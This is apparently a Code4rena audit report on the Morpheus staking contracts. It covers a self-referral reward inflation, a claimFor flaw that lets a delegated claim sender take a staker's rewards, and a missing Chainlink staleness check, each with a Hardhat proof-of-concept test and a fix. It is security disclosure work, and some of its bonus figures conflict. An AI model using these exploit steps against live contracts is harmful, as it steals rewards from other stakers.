# High 

## [H-1] Self-Referral Lets Malicious Users to Unfairly Receive Rewards
### Links
https://github.com/code-423n4/2025-08-morpheus/blob/a65c254e4c3133c32c05b80bf2bd6ff9eced68e2/contracts/capital-protocol/DepositPool.sol#L254

### Finding description
The `DepositPool::stake()` function allows users to stake tokens in the system. In addition, the protocol has implemented a referral system. Because of this, a user is able to also pass in a referrer address to the stake function in order to participate in the referral system.

However, a malicious user is able to simply add their own address and act as their own referrer. This allows them to be able to receive the 1% addition in rewards for being the referee and also additional rewards for being the referrer.

### Impact & Likelihood
**Impact:** High
By setting themselves as their own referrer, a user can inflate their rewards by up to 6% (1% referee bonus + 5% referrer bonus for Tier 3, achieved with ≥ 350 stETH staked). This unfairly reduces the MOR reward pool for legitimate participants, as self-referring users gain additional rewards without contributing to community growth.

**Likelihood:** High
The exploit requires only a single call to `stake` with the user’s own address as `referrer_`, which is straightforward and requires no special conditions or permissions.

### Proof of Concept
The following test can be added to the `POC.test.ts` file. However, does also need an additional import that is specified bellow: 

<details><summary>Code PoC</summary>

```ts
import { getDefaultPool, getDefaultReferrerTiers, oneDay, oneHour } from './helpers/distribution-helper';

it('POC-Audit-4: DepositPool - Self-Referral Reward Manipulation', async function () {
      // Setup reward pool timestamp & Referrer Tiers
      await distributor.setRewardPoolLastCalculatedTimestamp(publicRewardPoolId, 1);
      const referrerTiers = getDefaultReferrerTiers();
      await depositPool.editReferrerTiers(publicRewardPoolId, referrerTiers);

      // Set time to start reward distribution
      await setNextTime(oneDay * 11);

      // Step 1: Alice stakes with self-referral
      const stakeAmount = wei(100); // 100 stETH
      await depositToken.mint(alice.address, stakeAmount);
      await depositToken.connect(alice).approve(depositPool.getAddress(), stakeAmount);
      await depositPool.connect(alice).stake(publicRewardPoolId, stakeAmount, 0, alice.address); // Self-referral
      const aliceData = await depositPool.usersData(alice.address, publicRewardPoolId);
      console.log('Alice deposited:', ethers.formatEther(aliceData.deposited), 'stETH');
      console.log('Alice virtual deposited (self-referral):', ethers.formatEther(aliceData.virtualDeposited), 'stETH');

      // Step 2: Bob stakes without referral for comparison
      await depositToken.mint(bob.address, stakeAmount);
      await depositToken.connect(bob).approve(depositPool.getAddress(), stakeAmount);
      await depositPool.connect(bob).stake(publicRewardPoolId, stakeAmount, 0, ZERO_ADDR); // No referrer
      const bobData = await depositPool.usersData(bob.address, publicRewardPoolId);
      console.log('Bob deposited:', ethers.formatEther(bobData.deposited), 'stETH');
      console.log('Bob virtual deposited (no referral):', ethers.formatEther(bobData.virtualDeposited), 'stETH');

      // Step 3: Check referrer data for Alice
      const referrerData = await depositPool.referrersData(alice.address, publicRewardPoolId);
      console.log('Alice referrer virtual amount staked:', ethers.formatEther(referrerData.virtualAmountStaked), 'stETH');

      // Step 4: Validate exploit
      // Assume _getUserTotalMultiplier gives 1% bonus for referee (1.01x) and _applyReferrerTier gives 3% for Tier 0
      const expectedAliceVirtual = stakeAmount * 101n / 100n; // 1% referee bonus
      const expectedBobVirtual = stakeAmount; // No bonus
      const expectedAliceReferrerBonus = stakeAmount *3n / 100n; // 2.5% Tier 0 bonus
      expect(aliceData.virtualDeposited).to.equal(expectedAliceVirtual, 'Alice should get 1% referee bonus');
      expect(bobData.virtualDeposited).to.equal(expectedBobVirtual, 'Bob should get no bonus');
      expect(referrerData.virtualAmountStaked).to.equal(wei(2.5), 'Alice’s referrer data should track her stake');
      console.log('Exploit: Alice gains 1% referee bonus and 2.5% referrer bonus by self-referring');
    });
```

</details><br>

Output from running the test:

<details><summary>Output</summary>

```zsh
  Morpheus Capital Protocol - POC Test Suite
    POC Templates
Alice deposited: 100.0 stETH
Alice virtual deposited (self-referral): 101.0 stETH
Bob deposited: 100.0 stETH
Bob virtual deposited (no referral): 100.0 stETH
Alice referrer virtual amount staked: 2.5 stETH
Exploit: Alice gains 1% referee bonus and 3% referrer bonus by self-referring
      ✔ POC-Audit-4: DepositPool - Self-Referral Reward Manipulation (53ms)


  1 passing (2s)
```
</details><br>

**Explanation:**
- Alice stakes 100 stETH with herself as the referrer, gaining a 1% referee bonus (`virtualDeposited = 101 stETH`).
- Her `referrersData.virtualAmountStaked` is set to 2.5 stETH, reflecting a 2.5% referrer bonus for Tier 0, allowing her to claim additional `MOR` rewards via `claimReferrerTier`.
- Bob stakes 100 stETH without a referrer, receiving no bonus (`virtualDeposited = 100 stETH`).
- The exploit demonstrates that Alice unfairly gains a total of 3.5% extra rewards (1% + 2.5%) without referring others. For larger stakes (≥ 350 stETH), this could increase to 6% (1% + 5% for Tier 3).

### Recommendation
Add a check that either reverts if someone put themselves as the referrer or perhaps changes it back to `address(0)`.

Example:
<details><summary>Diff</summary>

```diff
function _stake(
    address user_,
    uint256 rewardPoolIndex_,
    uint256 amount_,
    uint256 currentPoolRate_,
    uint128 claimLockEnd_,
    address referrer_
) private {
    require(isMigrationOver == true, "DS: migration isn't over");
+   require(referrer_ != _msgSender(), "DS: cannot self-refer"); 
    // ...
}
```
</details><br>

## [H-2] Claim Senders Can Steal the Stakers Rewards
### Links
https://github.com/code-423n4/2025-08-morpheus/blob/a65c254e4c3133c32c05b80bf2bd6ff9eced68e2/contracts/capital-protocol/DepositPool.sol#L294

### Finding description
The protocol allows users to add addresses that could claim the rewards on their behalf, but these senders do not receive the rewards they only call claim to get the rewards back to the original staker. The staker will call the `DepositPool::setClaimSender` function to do so. 

The issue arises as the're are not enough checks to make sure that the arbitrary receiver is permissioned. 

A user that has been added to the claim senders can call `DepositPool::claimFor` and put any address in the `receiver_` parameter. This can happen if the staker has not set a receiver address using the `DepositPool::setClaimReceiver` function. 

Here is a walkthrough of the checks:
1. Checking if staker has set a receiver address.
2. If so we set the receiver. So far so good.
3. If staker has not set a receiver we make sure the caller is allowed to claim on behalf of staker. This is ok but should really be checked regardless.
4. No other checks for arbitrary receiver. And claiming continues. 

<details><summary>Code Snippet</summary>

```solidity
function claimFor(uint256 rewardPoolIndex_, address staker_, address receiver_) external payable {
        // 1.
        if (claimReceiver[rewardPoolIndex_][staker_] != address(0)) {
        // 2. 
            receiver_ = claimReceiver[rewardPoolIndex_][staker_];
        } else {
        // 3. 
            require(claimSender[rewardPoolIndex_][staker_][_msgSender()], "DS: invalid caller");
        }

        // 4. 
        _claim(rewardPoolIndex_, staker_, receiver_); 
    }
```

<details><br>

### Impact & Likelihood
**Impact:** High
This vulnerability allows sender claimers to steal the rewards from the stakers. This functionality is only intended to claim the rewards on behalf of staker and for the rewards to be sent to staker. Stealing of another users funds!

**Likelihood:** Medium
Not all users will use the senders functionality and this can be prevented if they do set a receiver. However, if they allow senders without specified receiver all their rewards are at risk. 

### Proof of Concept
This PoC lacks the showing of balance movement. This is because of the way the mock of the `LayerZeroEndPointV2Mock` is structured. It did not match the actual contract and kept causing issues like this output:

<details><summary>Sample output of issue</summary>

```zsh
  1) Morpheus Capital Protocol - POC Test Suite
       POC Templates
         POC-1: DepositPool - Bob claims rewards on behalf of alice even if not receiver:
     Error: Transaction reverted: function selector was not recognized and there's no fallback function
```

</details><br>

In order to make the PoC pass I had to go into the `LayerZeroEndPointV2Mock` and place an empty but correctly structured `send` function (as used in the `L1Sender` contract). This was left empty as it took to much time to do this myself and it does need doing to prove the point of the exploit:

<details><summary>Code Snippet</summary>

```solidity
    function send(
        uint16 _dstChainId,
        bytes calldata _destination,
        bytes calldata _payload,
        address payable _refundAddress,
        address _zroPaymentAddress,
        bytes calldata _adapterParams
    ) external payable {
    }
```

</details><br>

Here is the PoC that shows the exploit. Can be added in `POC.test.ts`:

<details><summary>Code PoC</summary>

```ts
    it('POC-1: DepositPool - Bob claims rewards on behalf of alice even if not receiver', async function () {
      // Setup reward pool timestamp (required before any staking)
      await distributor.setRewardPoolLastCalculatedTimestamp(publicRewardPoolId, 1);
      
      // Setting up L1Sender:
      await l2MessageReceiver.setParams(mor, {
        gateway: lzEndpointL1,
        sender: l1Sender,
        senderChainId: l1ChainId,
      });

      await l1Sender.setLayerZeroConfig({
        gateway: lzEndpointL1,
        receiver: l2MessageReceiver,
        receiverChainId: l2ChainId,
        zroPaymentAddress: ZERO_ADDR,
        adapterParams: '0x',
      });
      await l1Sender.setDistributor(distributor);

      // Set time to start reward distribution
      await setNextTime(oneDay * 11);

      // 1. Alice stakes tokens
      await depositPool.connect(alice).stake(publicRewardPoolId, wei(100), 0, ZERO_ADDR);
      await depositPool.connect(alice).lockClaim(publicRewardPoolId, oneDay * 18);

      // 2. Alice adds Bob to be a claim sender but not receive. Meaning Bob can claim rewards ob Alice's behalf but not receive the rewards. Alice does not set a receiver.
      const sendersList: Array<AddressLike> = [bob.address];
      const allowedList: Array<boolean> = [true];
      await depositPool.connect(alice).setClaimSender(publicRewardPoolId, sendersList, allowedList);

      // Fast forward time
      await setNextTime(oneDay * 19);
      // Making sure Alice has some rewards
      const aliceData = await depositPool.usersData(alice.address, publicRewardPoolId);
      expect(aliceData.pendingRewards).to.not.equal(0, 'No rewards for Alice');

      // 3. Bob calls `claimFor` but leaves himself as the receiver
      await depositPool.connect(bob).claimFor(publicRewardPoolId, alice, bob, { value: wei(0.1) } );
    });
```

</details><br>

This is passing. Which indicates that, at no point, the protocol stops this behavior. 

### Recommendation
Add more checks to make sure that the arbitrary receiver parameter is correct. Another option would be that if staker has not specified receiver, we put the stakers address instead. Which eliminates the arbitrary receiver in the first place, which I recommend. Also make sure that the check for sender is done for all scenarios:

```diff
- function claimFor(uint256 rewardPoolIndex_, address staker_, address receiver_) external payable {
+ function claimFor(uint256 rewardPoolIndex_, address staker_) external payable {
+       require(claimSender[rewardPoolIndex_][staker_][_msgSender()], "DS: invalid caller");
+
        if (claimReceiver[rewardPoolIndex_][staker_] != address(0)) {
            receiver_ = claimReceiver[rewardPoolIndex_][staker_];
        } else {
+           receiver_ = staker_
-           require(claimSender[rewardPoolIndex_][staker_][_msgSender()], "DS: invalid caller");
        }

        _claim(rewardPoolIndex_, staker_, receiver_); 
    }
}
```

# Medium

## [M-1] Missing `roundId` vs. `answeredInRound` Check on Chainlink Feed
### Finding description
The `getChainLinkDataFeedLatestAnswer` function does not verify that `answeredInRound >= roundId`, risking the use of stale price data if the oracle’s round updates are delayed.

The function, as of now, does validate the allowed time for `block.timestamp` and that the `answer` is positive and non zero. However, it is considered best practice to check that the `answeredInRound` is not stale. This check is not utilised in the function.

### Impact & Likelihood
- **Impact:**
Stale data could lead to stale pricing and could affect the correct operation of the protocol and user funds.

Therefore, deemed as HIGH.

- **Likelihood:**
There are some checks the exist already that could potentially catch most issues. However, these checks fail to cover everything. 

Therefore, deemed as LOW. 

### Proof of Concept
Paste the following test in the POC.test.ts test suite:

<details><summary>Code PoC</summary>

```ts
    it('POC: ChainLinkDataConsumer - Stale Price Data Accepted Due to Missing roundId vs. answeredInRound Check', async function () {
      // Set allowed price update delay
      await chainLinkDataConsumer.setAllowedPriceUpdateDelay(3600); // 1 hour

      // Step 1: Configure the ETH/USD feed to return stale data
      const currentTime = await getCurrentBlockTime();
      const initialPrice = wei(2000, 18); // $2000/ETH
      const stalePrice = wei(1000, 18); // Stale price from an earlier round

      // Set a valid initial price for the current round
      await ethUsdFeed.setAnswerResult(initialPrice);
      await ethUsdFeed.setUpdated(currentTime);
      await ethUsdFeed.setRoundData(2, initialPrice, currentTime, currentTime, 2); // roundId=2, answeredInRound=2

      // Step 2: Simulate a new round with no answer update (stale data)
      await ethUsdFeed.setRoundData(3, stalePrice, currentTime - 1800, currentTime - 1800, 1); // roundId=3, answeredInRound=1
      await ethUsdFeed.setUpdated(currentTime - 1800); // Within allowedPriceUpdateDelay (3600 seconds)

      // Step 3: Fetch price from ChainLinkDataConsumer
      const pathId = await chainLinkDataConsumer.getPathId('ETH/USD');
      const price = await chainLinkDataConsumer.getChainLinkDataFeedLatestAnswer(pathId);

      // Step 4: Validate the vulnerability
      // The contract should return 0 or revert due to stale data (answeredInRound < roundId), but it returns the stale price
      expect(price).to.equal(stalePrice, 'ChainLinkDataConsumer accepted stale price data');
      console.log('ETH/USD price (stale):', ethers.formatEther(price), 'USD');
      console.log('Expected behavior: Contract should revert or return 0 due to answeredInRound < roundId');

      // Step 5: Demonstrate correct behavior with fresh data
      await ethUsdFeed.setRoundData(4, initialPrice, currentTime, currentTime, 4); // Fresh data: roundId=4, answeredInRound=4
      await ethUsdFeed.setUpdated(currentTime);
      const freshPrice = await chainLinkDataConsumer.getChainLinkDataFeedLatestAnswer(pathId);
      expect(freshPrice).to.equal(initialPrice, 'ChainLinkDataConsumer returned correct price for fresh data');
      console.log('ETH/USD price (fresh):', ethers.formatEther(freshPrice), 'USD');
    });
```

</details><br>

This best practice is also described in the following well known X thread which describes best practices: https://x.com/saxenism/status/1656632744279982080

In addition in the following finding found in the `Tigris Trade` contest:
https://solodit.cyfrin.io/issues/m-24-chainlink-price-feed-is-not-sufficiently-validated-and-can-return-stale-price-code4rena-tigris-trade-tigris-trade-contest-git

### Recommendation
Update the `Distributor::updateDepositTokensPrices` function so it also makes sure the answer that was received is not stale:

<details><summary>Diff</summary>

```diff
function getChainLinkDataFeedLatestAnswer(bytes32 pathId_) external view returns (uint256) {
    ...Code Snip...
-   try aggregator_.latestRoundData() returns (uint80, int256 answer_, uint256, uint256 updatedAt_, uint80) 
+   try aggregator_.latestRoundData() returns (uint80 roundId, int256 answer_, uint256, uint256 updatedAt_, uint80 answeredInRound) {
        if (answer_ <= 0) {
            return 0;
        }

+       if (answeredInRound < roundId) {
+           return 0;
+       }

        if (block.timestamp < updatedAt_ || block.timestamp - updatedAt_ > allowedPriceUpdateDelay) {
            return 0;
        }

        ...Code Snip...
    }
    ...Code Snip...
}
```

</details><br>

# Low


# Info